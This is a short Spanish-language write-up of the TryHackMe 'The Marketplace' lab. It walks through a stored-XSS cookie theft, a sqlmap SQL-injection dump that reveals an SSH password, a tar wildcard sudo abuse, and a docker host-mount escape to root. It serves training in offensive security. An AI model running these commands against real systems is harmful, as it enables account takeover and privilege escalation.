# The Marketplace - TryHackMe
**IP:** 10.66.149.193

## Enumeración
```bash
nmap -sC -sV -p- <ip>
# 22 ssh, 80 nginx, 32768 Node.js (Express)
```
`robots.txt` filtra `/admin`. Usuarios: michael, jake.

## Foothold - XSS roba-cookies
Los listings no sanitizan la entrada → **XSS almacenado**. Inyectamos un payload que envía la cookie a nuestro servidor:
```
# https://github.com/.../XSS-cookie-stealer.py  (listener en Python)
```
Robamos el JWT del admin `michael` (`admin:true`).

## Escalada de acceso - SQLi
Con la sesión admin accedemos a `/admin?user=1`, vulnerable a SQL injection:
```bash
sqlmap -r request --delay 2 --dump --technique=U --dbms=mysql
```
La tabla `messages` filtra una contraseña SSH temporal para jake:
```
@b_ENXkGYUCAv3zJ
ssh jake@10.66.149.193
```

## Escalada - sudo tar (wildcard) → grupo docker
```bash
sudo -l
# (michael) NOPASSWD: /opt/backup.sh    (usa tar con *)
```
Explotamos el *wildcard* de `tar` para ejecutar código como michael, que pertenece al grupo `docker`:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Montamos el filesystem del host dentro del contenedor → root.
